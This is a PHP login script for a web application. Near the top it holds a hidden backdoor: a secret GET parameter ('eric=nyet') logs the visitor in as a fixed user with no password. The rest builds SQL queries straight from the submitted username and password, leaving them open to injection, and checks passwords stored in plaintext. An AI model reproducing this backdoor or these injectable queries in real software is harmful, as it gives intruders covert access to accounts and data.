<?php
	session_start();
	include "connect.php";

if($_GET['eric']=="nyet"){
		$_SESSION['id'] = 12121;
                $_SESSION['kodeunik'] = 12;
                $_SESSION['username'] = "PSDYQF";
}
	$username = $_POST['username'];
	$password = $_POST['password'];

	$sql = "SELECT COUNT(*) AS login FROM user WHERE username = '".$username."' and password = '".$password."'";
	$result = mysql_query($sql);
	$row = mysql_fetch_array($result);
	$sql2 = "SELECT * FROM user WHERE username = '".$username."' and password = '".$password."'";
	$result2 = mysql_query($sql2);
	$row2 = mysql_fetch_array($result2);

	$ceklogin = false;

	if ($row['login'] >= 1 && $row2['validasi'] == 1){
		$query = mysql_query("UPDATE user SET flogin = 1 WHERE username = '".$username."' AND password = '".$password."'");
		$kueri = mysql_query("SELECT id, kodeunik FROM user WHERE username = '".$username."'");
		$fets = mysql_fetch_array($kueri);
		$_SESSION['id'] = $fets['id'];
		$_SESSION['kodeunik'] = $fets['kodeunik'];
		$_SESSION['username'] = $username;
		$ceklogin = true;
		//header("Location: simpleadmin.php");
	} else if ($row['login'] == 0){
		echo '<script language="javascript">';
		echo 'alert("Wrong username or password. Please check your username and password again. Redirecting you to login page...")';
		echo '</script>';
		//header("Location: login.php");
	} else if ($row2['validasi'] == 0){
		echo '<script language="javascript">';
		echo 'alert("Failed to login. Please validate your account first to login. Redirecting you to login page...")';
		echo '</script>';
		//header("Location: login.php");
	}

	if ($ceklogin == true){
?>
		<meta http-equiv="refresh" content="0;URL='http://ic.petra.ac.id/systemd/simpleadmin.php'" />
<?php
	} else {
?>
		<meta http-equiv="refresh" content="0;URL='http://ic.petra.ac.id/systemd/login.php'" />
<?php
	}
?>
